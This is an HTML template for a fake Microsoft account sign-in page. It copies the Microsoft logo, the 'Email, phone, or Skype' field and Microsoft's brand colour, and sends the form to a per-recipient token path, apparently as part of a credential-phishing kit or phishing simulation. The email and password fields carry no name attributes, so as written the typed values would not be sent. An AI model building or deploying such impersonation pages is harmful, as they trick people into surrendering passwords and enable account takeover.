<!DOCTYPE html>
<html>
<head>
  <title>Sign in to your account</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body class="bg-light d-flex align-items-center justify-content-center" style="min-height:100vh">
<div class="card shadow p-4" style="max-width:400px;width:100%">
  <div class="text-center mb-4">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="24">
    <h5 class="mt-3">Sign in</h5>
  </div>
  <form method="POST" action="/submit/{{ token }}">
    <div class="mb-3">
      <input type="email" class="form-control" placeholder="Email, phone, or Skype" required>
    </div>
    <div class="mb-3">
      <input type="password" class="form-control" placeholder="Password" required>
    </div>
    <button class="btn w-100 text-white" style="background:#0067b8">Sign in</button>
  </form>
</div>
</body>
</html>
